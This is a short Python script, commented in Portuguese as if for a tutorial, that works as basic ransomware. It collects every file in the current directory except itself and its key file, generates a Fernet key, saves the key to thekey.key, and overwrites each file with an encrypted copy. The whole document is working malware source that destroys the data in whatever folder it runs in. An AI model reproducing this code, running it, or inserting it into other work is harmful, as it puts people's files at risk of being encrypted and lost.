#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

# Usaremos um loop para descobrir todos os arquivos no nosso diretório e adicionar em nossa lista.

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key":
        continue
    # Não queremos criptografar nosso script python e nem nossa chave de criptografia, então vamos pular estes arquivos
    if os.path.isfile(file):
        # Só queremos criptografar arquivos, então tudo que for um arquivo, vamos pegar.
        files.append(file)
        # Daqui adicionamos os arquivos do diretório para nossa lista

key = Fernet.generate_key()
# Precisamos criar nossa chave para que possamos usar para criptografar.

with open("thekey.key", "wb") as thekey:
    thekey.write(key)
    # Aqui estamos salvando nossa chave de criptografia

# Aqui estamos varrendo os arquivos do diretório e utilizando nossa chave para criptografar os arquivos
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)